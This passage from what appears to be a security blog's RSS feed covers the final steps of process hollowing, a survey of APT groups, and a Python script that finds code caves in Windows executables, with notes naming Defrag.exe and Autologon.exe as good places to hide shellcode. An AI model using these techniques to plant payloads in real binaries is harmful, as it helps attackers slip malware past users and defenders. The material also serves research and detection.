arial, &#39;lucida grande&#39;, sans-serif; font-size: 14px; line-height: 20px; margin-bottom: 15px; padding-left: 30px;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;// Sets the context for the specified thread.&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;BOOL WINAPI SetThreadContext(&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in HANDLE hThread,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in const CONTEXT *lpContext&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;);&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;b&gt;Step6.&lt;/b&gt;&lt;br /&gt;It&#39;s time to resume the suspended thread (&lt;b&gt;ResumeThread&lt;/b&gt;) and &#34;game over&#34; !&lt;br /&gt;&lt;br /&gt;&lt;div style=&#34;background-color: #eeeeee; box-sizing: border-box; color: #555555; font-family: &#39;helvetica neue&#39;, helvetica, arial, &#39;lucida grande&#39;, sans-serif; font-size: 14px; line-height: 20px; margin-bottom: 15px; padding-left: 30px;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-size: 10pt;&#34;&gt;// Decrements a thread&#39;s suspend count. When the suspend count is&amp;nbsp;&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;// decremented to zero, the execution of the thread is resumed.&lt;/span&gt;&lt;br style=&#34;box-sizing: border-box; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; font-size: 10pt;&#34;&gt;DWORD WINAPI ResumeThread(&lt;/span&gt;&lt;br style=&#34;box-sizing: border-box; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; font-size: 10pt;&#34;&gt;__in HANDLE hThread&lt;/span&gt;&lt;br style=&#34;box-sizing: border-box; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; font-size: 10pt;&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;br /&gt;We&#39;ve just fired up a brand new (and potentially malicious) process!&lt;br /&gt;&lt;br /&gt;Focusing on detection, it is going to be hard if using static signatures (such as AntiVirus romantic signatures) but having the possibility to dynamically analyse system calls (such as a sandboxed environment) the detection rate will increase drastically.&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Notorious Hacking Groups in mid 2016</title>
      <link>http://marcoramilli.com/post/notorious-hacking-groups-in-mid-2016/</link>
      <pubDate>Mon, 16 May 2016 20:24:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/notorious-hacking-groups-in-mid-2016/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;It happens from time to time people asking me what are the most &#34;notorious hacking groups&#34;. On February 2015 I wrote a little bit on most notorious group in 2015 (&lt;a href=&#34;http://marcoramilli.blogspot.it/2015/02/notorious-hacking-groups.html&#34;&gt;here&lt;/a&gt;) but today things changed a little bit. It&#39;s hard to answer to such a question since we need a strong definition of &#34;notorious&#34;, do we mean the most known groups ever ? Or do we mean the most successful groups ? Or, again, the ones who attack few big organisations or the ones who attacks successfully millions of user PCs ? OK, we might go forth forever on that, so I&#39;ll give my personal point of view (which is debatable) based on my findings and on my daily activities.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The following list is not complete at all and it never will be, but if you want to start from scratch to looks for &#34;notorious&#34; group here a nice start:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Pawn&lt;/b&gt; &lt;b&gt;Storm&lt;/b&gt;, &amp;nbsp;(&lt;a href=&#34;http://www.trendmicro.com/pawnstorm%20and%20http://www.darkreading.com/vulnerabilities---threats/apt-group-pawn-storm-ratchets-up-attacks/d/d-id/1320019&#34;&gt;Operation PawnStorm&lt;/a&gt;) is for sure one of the most interesting hacking group we might observe nowadays.&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34; style=&#34;text-align: justify;&#34;&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;It is an active economic and political  cyber espionage operation that targets a wide range of high-profile  entities, from government institutions to media personalities. Its  activities were first seen as far back as 2004, but recent developments  have revealed more concrete details about the operation itself,  including its origins and targets.&lt;/span&gt;&lt;/blockquote&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Regin&lt;/b&gt;. I&#39;ve been writing about Regin (&lt;a href=&#34;http://marcoramilli.blogspot.it/2014/11/regeneration-regin-targeted-attack.html&#34;&gt;here&lt;/a&gt;)&amp;nbsp;and at that time it was mainly considered an attack. Nowadays after several observable attacks we think it &#39;s most a group of people who built sophisticated attaching tools. &amp;nbsp;&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34; style=&#34;text-align: justify;&#34;&gt;Regin, first identified in 2008, is a  highly complex threat used by the APT group for large-scale data  collection and intelligence-gathering campaigns. The development and  operation of this threat would have required a significant investment of  time and resources. Threats of this nature are rare and the discovery  of Regin serves to highlight how significant investments continue to be  made into the development of tools for use in intelligence-gathering.  Many components of the Regin tools remain undiscovered, and additional  functionality and versions may exist.&lt;/blockquote&gt;&lt;div&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;&lt;b style=&#34;font-weight: bold;&#34;&gt;Emissary Panda. &lt;/b&gt;Discovered in 2015 but active since 2013 E.Panda is a Chinese Hacking group targeting US-Military and US-Defense infrastructures as well as critical infrastructures in USA. The attackers used contractors Managers and Directors to exfiltrate classified information from secret projects.&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;&lt;b&gt;Potato Group. &lt;/b&gt;The group behind the most known &#34;Operation Potato Express&#34; (&lt;a href=&#34;http://www.welivesecurity.com/2015/07/30/operation-potao-express/&#34;&gt;here&lt;/a&gt;). The group mostly operates targeting Russia, Belarus and Ukraine Govs and news agencies. The attacks were used even to spy members of &lt;a href=&#34;https://en.wikipedia.org/wiki/MMM_%28Ponzi_scheme_company%29&#34;&gt;MMM&lt;/a&gt;, a Ponzi scheme company popular in Russia&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;The attacks conducted using the Win32/Potao malware family span the past 5 years, the first detections dating back to 2011. The attackers are, however, still very active, with the most recent infiltration attempts detected by ESET in July 2015.&lt;/span&gt;&lt;/span&gt;&lt;/blockquote&gt;&lt;/div&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;&lt;b&gt;Waterbug. &amp;nbsp;&lt;/b&gt;Discovered and described by Symantec (&lt;a href=&#34;https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf&#34;&gt;here&lt;/a&gt;) Waterbub was o&lt;span class=&#34;docimagecaptiontext&#34;&gt;perating since 2005.&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;div&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;&lt;span class=&#34;docimagecaptiontext&#34;&gt;Waterbug is likely a state-sponsored group which uses an attack network  (“Venom”) that consists of 84 compromised domains (websites). The  watering-hole websites used by the Waterbug group are located in many  different countries. The greatest number of compromised websites are  found in France (19%), Germany (17%), Romania (17%), and Spain (13%).&lt;/span&gt;&lt;/span&gt;&lt;/blockquote&gt;&lt;b&gt;DragonFly. &lt;/b&gt;Discovered and firstly mitigated by Symantec (&lt;a href=&#34;https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf&#34;&gt;here&lt;/a&gt;) the group mainly attacks Energy Suppliers:&lt;br /&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;Dragonfly, likely a group of hackers  operating out of Eastern Europe since 2011, bears the hallmarks of a  state-sponsored operation. Analysis of the compilation timestamps on the  malware used by the attackers indicate that the group mostly worked  between Monday and Friday, with activity mainly concentrated in a  nine-hour period that corresponded to a 9am to 6pm working day in the  UTC +4 time zone.&lt;/blockquote&gt;&lt;b&gt;Sandworm.&lt;/b&gt;&amp;nbsp;Known for its most famous (so far) APT called BlackEnergy (&lt;a href=&#34;http://www.cyberdefensemagazine.com/isight-partners-says-the-sandworm-apt-is-involved-ukrainian-power-outage/&#34;&gt;here&lt;/a&gt;). Built from Russia against Ukraine during the political conflict Sandworm is a skilled group specialised in SandBox evasion tricks and documents (OLE) worms.&lt;br /&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;b&gt;GovRat. &lt;/b&gt;Group behind several Governmental attacks and&lt;b&gt;&amp;nbsp;&lt;/b&gt;Discoverd and Mitigated by infoArmor&lt;b&gt;&amp;nbsp;&lt;/b&gt;(&lt;a href=&#34;https://infoarmor.com/pdf/advanced-persistent-threats-code-signing/&#34;&gt;here&lt;/a&gt;)&lt;br /&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;Several English-speaking developers  began creating custom malware and using it as a group in 2015. GovRAT is  the name they gave the malware – which is used primarily for cyber  espionage, and is also the code name of the group, the hackers using it  for infections.&amp;nbsp;&lt;/blockquote&gt;&lt;br /&gt;Among these groups plenty of famous smallest and biggest groups are out there, some of there are notorious as well while some other are stille hidden, so please consider that list incomplete and based on personal experiences and not on scientific review process.&lt;/div&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Looking For Caves in Windows Executables</title>
      <link>http://marcoramilli.com/post/looking-for-caves-in-windows-executables/</link>
      <pubDate>Wed, 20 Apr 2016 02:52:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/looking-for-caves-in-windows-executables/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Most of my readeres exactly know what &lt;i&gt;code caves &lt;/i&gt;are while many other people out there (maybe occasional readers) could wonder why I am writing about &lt;i&gt;codecaves&lt;/i&gt; in 2016 since it is a well know technique (published in 2006) to inject a malicious payload inside Windows Portable Executables. Well, today I want to disclouse a super simple python script that I used to calcultate the cave sizes (/x00) in windows executable. Code caves are places in where attackers could inject ShellCodes and execute them deflecting the normal program behaviour. Moreover I would like to discuss a little bit about the average size of free spots available in some of the most known executable shipped in Windows OS.&lt;/div&gt;&lt;br /&gt;&lt;b&gt;Two bits on CodeCaves (just to revise it)&lt;/b&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;A codecave can best be defined as &#34;a redirection of program execution to another location and then returning back to the area where program execution had previously left.&#34; In a sense, a codecave is no different in concept than a function call, except for a few minor differences. If a codecave and a function call are so similar, why do we need codecaves at all then? The reason we need codecaves is because source code is rarely available to modify any given program. As a result, we have to physically (or virtually) modify the executable at an assembly level to make changes.  At this point a few alarms and whistles may be going off for a few readers. What legitimate reason would we ever have to do so, modify an existing program for which no source is available? Consider the following hypothetical, but not too farfetched, scenario:      A company that has been using the same software system they developed for the past 10 years. The software system they are using has served them well, but it is time to upgrade it to reflect a mandatory change in the output data format. The only problem is the original programmers are long gone and there are no hopes of getting the original source code to update the program. Now, this company has trained it&#39;s now veteran employees and grown the past 10 years using this specific software system, so a complete rewrite would be quite disastrous to the company. Retraining all their employees to a new system and having to reprogram things differently is not only time consuming but very costly. It would take about a year to do such and this is out of the time frame that the company has. The worst part of it all is that you are the programmer that was hired to solve this issue.   You could just throw up your hands and say it is not possible, but that would not do much to help your professional career. Instead, imagine if there was a way that you could keep using the same program, but you have an additional DLL that is used to dynamically update the output data from the company&#39;s program so it fits the new standard that is required. Best of all, it is a solution that can be implemented well before your deadline and requires minimal changes to be made to the company&#39;s existing procedures of using the program. Enter codecaves. &lt;/blockquote&gt;&lt;br /&gt;&lt;b&gt;Find Caves &lt;/b&gt;&lt;br /&gt;&lt;br /&gt;The following script (&lt;a href=&#34;https://github.com/marcoramilli/find_pe_caves&#34;&gt;Find_PE_Caves&lt;/a&gt;) takes as input a directory, it&amp;nbsp; looks for all PE files in it. It then takes every PE file and starts to look for multi dimensioning caves on it. It first tries to search for available 21bits (the smallest mok shellcode available today) and later it tries to search for available 1024bits caves. It ends up by writing down stats files on how many caves it did find on given files.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;pre&gt;#!/usr/bin/env python2&lt;br /&gt;&lt;br /&gt;#========================================================================#&lt;br /&gt;#               THIS IS NOT A PRODUCTION RELEASED SOFTWARE               #&lt;br /&gt;#========================================================================#&lt;br /&gt;# Purpose of finMaliciousRelayPoints is to proof the way it&#39;s possible to#&lt;br /&gt;# discover TOR malicious Relays Points. Please do not use it in          #&lt;br /&gt;&lt;br /&gt;# any production  environment                                            #&lt;br /&gt;&lt;br /&gt;# Author: Marco Ramilli                                                  #&lt;br /&gt;# eMail: XXXXXXXX                                                        #&lt;br /&gt;# WebSite: marcoramilli.blogspot.com                                     #&lt;br /&gt;# Use it at your own                                                     #&lt;br /&gt;#========================================================================#&lt;br /&gt;&lt;br /&gt;#==============================Disclaimer: ==============================#&lt;br /&gt;#THIS SOFTWARE IS PROVIDED BY THE AUTHOR &#34;AS IS&#34; AND ANY EXPRESS OR      #&lt;br /&gt;#IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED          #&lt;br /&gt;#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE  #&lt;br /&gt;#DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,      #&lt;br /&gt;#INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES      #&lt;br /&gt;#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR      #&lt;br /&gt;#SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)      #&lt;br /&gt;#HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,     #&lt;br /&gt;#STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING   #&lt;br /&gt;#IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE      #&lt;br /&gt;#POSSIBILITY OF SUCH DAMAGE.                                             #&lt;br /&gt;#========================================================================#&lt;br /&gt;&lt;br /&gt;#-------------------------------------------------------------------------&lt;br /&gt;#------------------- GENERAL SECTION -------------------------------------&lt;br /&gt;#-------------------------------------------------------------------------&lt;br /&gt;import sys&lt;br /&gt;import re&lt;br /&gt;try:&lt;br /&gt;    import pyprind&lt;br /&gt;except ImportError:&lt;br /&gt;    print &#39;pyprind not installed, see https://github.com/rasbt/pyprind&#39;&lt;br /&gt;    sys.exit()&lt;br /&gt;try:&lt;br /&gt;    import pefile&lt;br /&gt;    import peutils&lt;br /&gt;except ImportError:&lt;br /&gt;    print &#39;pefile not installed, see http://code.google.com/p/pefile/&#39;&lt;br /&gt;    sys.exit()&lt;br /&gt;try:&lt;br /&gt;    import magic&lt;br /&gt;except ImportError:&lt;br /&gt;    print &#39;python-magic is not installed, file types will not be available&#39;&lt;br /&gt;    sys.exit()&lt;br /&gt;import os&lt;br /&gt;import glob&lt;br /&gt;&lt;br /&gt;#----------------------------------------------------------------------&lt;br /&gt;#----------------     Starting Coding   -------------------------------&lt;br /&gt;#----------------------------------------------------------------------&lt;br /&gt;&lt;br /&gt;def open_file(arg,mode):&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    Open a File  and returns the FileNode.&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    try:&lt;br /&gt;        file =  open(arg,mode).read()&lt;br /&gt;    except IOError as e:&lt;br /&gt;        print str(e)&lt;br /&gt;        sys.exit(1)&lt;br /&gt;    return file&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;def get_executables(files):&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    Filters the only executable files from a files array&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    exec_files = []&lt;br /&gt;    for file in files:&lt;br /&gt;        if &#34;executable&#34; in magic.from_file(file):&lt;br /&gt;            exec_files.append(file)&lt;br /&gt;    return exec_files&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;def get_sections(binary_file):&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    Gets file sections =&amp;gt; thanks to PE.&lt;br /&gt;    Returns an multiDimensional array: [binary_file, sections_exe, sections_data]&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    sections_exe = []&lt;br /&gt;    sections_data = []&lt;br /&gt;    pe = pefile.PE(data=binary_file)&lt;br /&gt;    sections = pe.sections&lt;br /&gt;    for section in sections:&lt;br /&gt;        # 0x20000000 IMAGE_SCN_MEM_EXECUTE&lt;br /&gt;        # 0x40000000 IMAGE_SCN_MEM_READ&lt;br /&gt;        # 0x00000020 IMAGE_SCN_CNT_CODE&lt;br /&gt;        if all(section.Characteristics &amp;amp; n for n in&amp;nbsp;&lt;/pre&gt;&lt;pre&gt;            [0x20000000, 0x40000000, 0x00000020]):&lt;br /&gt;            sections_exe.append(section)&lt;br /&gt;        else:&lt;br /&gt;            sections_data.append(section)&lt;br /&gt;    return [binary_file, sections_exe, sections_data]&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;def get_codecaves(section,binary,size):&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    Looks for caves into a binary file in a specifc PE section&lt;br /&gt;    Return the caves array [section, offsets]&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    codecaves = []&lt;br /&gt;    raw_offset = section.PointerToRawData&lt;br /&gt;    length = section.SizeOfRawData&lt;br /&gt;    data = binary[raw_offset:raw_offset + length]&lt;br /&gt;    offsets = [m.start() for m in re.finditer(&#39;\x00&#39;*(size), data)]&lt;br /&gt;    if offsets:&lt;br /&gt;        codecaves.append(section)&lt;br /&gt;        codecaves.append(offsets)&lt;br /&gt;    return codecaves&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;def search_for_codecaves(sections_to_look_for, size):&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    Looks for caves in PE sections&lt;br /&gt;    Returns codecaves array&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    for section in sections_to_look_for[1]:#exec_sections&lt;br /&gt;        codecaves = get_codecaves(section, sections_to_look_for[0], size)&lt;br /&gt;        if codecaves:&lt;br /&gt;            return codecaves&lt;br /&gt;&lt;br /&gt;    for section in sections_to_look_for[2]:&lt;br /&gt;        codecaves = get_codecaves(section, sections_to_look_for[0], size)&lt;br /&gt;        if codecaves:&lt;br /&gt;            return codecaves&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;def save_files(data):&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;    Saves a CSV File within stats comma separeted virgula&lt;br /&gt;    Whatchout it creates as many file as analysed files&lt;br /&gt;    &#34;&#34;&#34;&lt;br /&gt;&lt;br /&gt;    for d in data:&lt;br /&gt;        print(&#34;[+] Saving plotting file for : %s&#34; % (d[0]))&lt;br /&gt;        fw = open(os.path.basename(d[0]) + &#34;.csv&#34;, &#39;a&#39;)&lt;br /&gt;        for point in d[1]:&lt;br /&gt;            fw.write(str(point[0]) + &#34;,&#34; + str(point[1]) + &#34;\n&#34;)&lt;br /&gt;        fw.close()&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;if __name__ == &#34;__main__&#34;:&lt;br /&gt;    #http://shell-stormorg/shellcode/files/shellcode-841.php.&lt;br /&gt;    shellcode_minimal_lenght = 21 &lt;br /&gt;    shellcode_max_lenght = 1024&lt;br /&gt;    max_progress = shellcode_max_lenght - shellcode_minimal_lenght&lt;br /&gt;    stats = []&lt;br /&gt;&lt;br /&gt;    if len(sys.argv) != 2:&lt;br /&gt;        print &#34;Usage: %s &lt;file directory=&#34;&#34;&gt;\n&#34; % (sys.argv[0])&lt;br /&gt;        print &#34;&#34;&#34;&lt;/file&gt;&lt;/pre&gt;&lt;pre&gt;                 The %s will search for caves inside&amp;nbsp;&lt;/pre&gt;&lt;pre&gt;                 &lt;file directory=&#34;&#34;&gt; and will save in current&amp;nbsp;&lt;/file&gt;&lt;/pre&gt;&lt;pre&gt;                  directory files within stas&#34; % (sys.argv[0])&lt;/pre&gt;&lt;pre&gt;               &#34;&#34;&#34;&lt;/pre&gt;&lt;pre&gt;&amp;nbsp;        sys.exit()&lt;br /&gt;&lt;br /&gt;    object = sys.argv[1]&lt;br /&gt;    files  = []&lt;br /&gt;&lt;br /&gt;    if os.path.isdir(object):&lt;br /&gt;        for root, dirs, filenames in os.walk(object):&lt;br /&gt;            for name in filenames:&lt;br /&gt;                files.append(os.path.join(root, name))&lt;br /&gt;    elif os.path.isfile(object):&lt;br /&gt;        files.append(object)&lt;br /&gt;    else:&lt;br /&gt;        print &#34;You must supply a file or directory!&#34;&lt;br /&gt;        sys.exit()&lt;br /&gt;&lt;br /&gt;    files = get_executables(files)&lt;br /&gt;&lt;br /&gt;    print(&#34;&#34;)&lt;br /&gt;    print(&#34;==========================================&#34;)&lt;br /&gt;    print(&#34;==========  Doing hard work here =========&#34;)&lt;br /&gt;    print(&#34;==========================================&#34;)&lt;br /&gt;    print(&#34;&#34;)&lt;br /&gt;&lt;br /&gt;    for f in files:&lt;br /&gt;        print (&#34;[+] Calculating carvings for : %s&#34; % (f))&lt;br /&gt;        bar = pyprind.ProgBar(max_progress)&lt;br /&gt;        points = []&lt;br /&gt;        binary_file = open_file(f,&#34;rb&#34;)&lt;/pre&gt;&lt;pre&gt;&amp;nbsp;       #[binary_file, exe_sections, data_section]&lt;/pre&gt;&lt;pre&gt;&amp;nbsp;       sections_to_look_for = get_sections(binary_file)   &lt;br /&gt;&lt;br /&gt;        for size in range(shellcode_minimal_lenght,1025):&lt;br /&gt;            codecaves = search_for_codecaves(sections_to_look_for, size)&lt;br /&gt;            if codecaves:&lt;br /&gt;                codecaves_per_size  = [size, len(codecaves[1])]&lt;br /&gt;            else:&lt;br /&gt;                codecaves_per_size  = [size, 0]&lt;br /&gt;            points.append(codecaves_per_size)&lt;br /&gt;            bar.update()&lt;br /&gt;        stats.append([f, points])&lt;br /&gt;&lt;br /&gt;    save_files(stats)&lt;br /&gt;&lt;br /&gt;&lt;/pre&gt;&lt;/div&gt;&lt;b&gt;Analyzing Famous Windows Executables&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;I &#39;ve been using the aforementioned script against some of the most known portable executables shipped with Microsoft Windows looking for -ready to go- caves in order to figure out where to hide payloads (only for research purposes). The analyzed files are the following ones:&lt;/div&gt;&lt;ul style=&#34;text-align: left;&#34;&gt;&lt;li&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/magazine/ff458356.aspx&#34;&gt;Defrag &lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/sysinternals/autologon.aspx&#34;&gt;Autologon &lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/sysinternals/bb897561.aspx&#34;&gt;Cacheset&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/sysinternals/winobj.aspx&#34;&gt;Winobj&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/sysinternals/psexec.aspx&#34;&gt;psexec&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;For each analized PE a simple ASCII graph shows the size distribution. Every ASCII graph sees on the x-ass the cave sizes and on the y-ass the number of caves for the given size.&lt;br /&gt;&lt;br /&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-F_g-j32yrQY/Vwq_7Z9CWEI/AAAAAAAAMsM/Agqf_XR7ULs6Sumkaz5IvhxO_8EXzOzwA/s1600/Screen%2BShot%2B2016-04-10%2Bat%2B23.04.06.png&#34; imageanchor=&#34;1&#34; style=&#34;clear: right; float: right; margin-bottom: 1em; margin-left: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;200&#34; src=&#34;https://4.bp.blogspot.com/-F_g-j32yrQY/Vwq_7Z9CWEI/AAAAAAAAMsM/Agqf_XR7ULs6Sumkaz5IvhxO_8EXzOzwA/s200/Screen%2BShot%2B2016-04-10%2Bat%2B23.04.06.png&#34; width=&#34;196&#34; /&gt;&lt;/a&gt;&lt;i&gt;&amp;nbsp;&lt;/i&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;i&gt;Defrag.exe:&lt;/i&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;High number of small caves are observable. The size esponentially decreases&lt;i&gt; (e^-x) &lt;/i&gt;but still a big spot for greater than 1024bits shellcode is present. This file could be a great &#34;trojan holder&#34;.&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;i&gt;Autologon.exe:&lt;/i&gt;&lt;br /&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-lozutUEgt1U/VwrBueSLQDI/AAAAAAAAMsY/2tFRfM_04tMjVFLMGROOLfuAaHG9p0gTQ/s1600/Screen%2BShot%2B2016-04-10%2Bat%2B23.11.42.png&#34; imageanchor=&#34;1&#34; style=&#34;clear: right; float: right; margin-bottom: 1em; margin-left: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;200&#34; src=&#34;https://3.bp.blogspot.com/-lozutUEgt1U/VwrBueSLQDI/AAAAAAAAMsY/2tFRfM_04tMjVFLMGROOLfuAaHG9p0gTQ/s200/Screen%2BShot%2B2016-04-10%2Bat%2B23.11.42.png&#34; width=&#34;190&#34; /&gt;&amp;nbsp;&lt;/a&gt;More caves were found for many sizes. If you have multiple stage payloads AutoLogon.exe is a great place to store shellcodes ! Wholes are realy big like Defrag.exe but still many of them are ready to be filled.&lt;i&gt; &lt;/i&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-_kpe1Rj6e84/VwrCCNPMmtI/AAAAAAAAMsc/FGis1YBafYgEg1xKAhS2Osk54e3EEl4HQ/s1600/Screen%2BShot%2B2016-04-10%2Bat%2B23.13.23.png&#34; imageanchor=&#34;1&#34; style=&#34;clear: right; float: right; margin-bottom: 1em; margin-left: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;200&#34; src=&#34;https://1.bp.blogspot.com/-_kpe1Rj6e84/VwrCCNPMmtI/AAAAAAAAMsc/FGis1YBafYgEg1xKAhS2Osk54e3EEl4HQ/s200/Screen%2BShot%2B2016-04-10%2Bat%2B23.13.23.png&#34; width=&#34;193&#34; /&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;i&gt;Cacheset.exe:&lt;/i&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Many small caves as well as big ones have been found.&amp;nbsp; Ideal for injecting many fragmented multi&amp;nbsp; stage payloads.&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-C30cX4-265o/VwrCUVYTdAI/AAAAAAAAMsg/dg66jLwzJQ4MqcnTllzyliT7LjQ6xzs-g/s1600/Screen%2BShot%2B2016-04-10%2Bat%2B23.14.33.png&#34; imageanchor=&#34;1&#34; style=&#34;clear: right; float: right; margin-bottom: 1em; 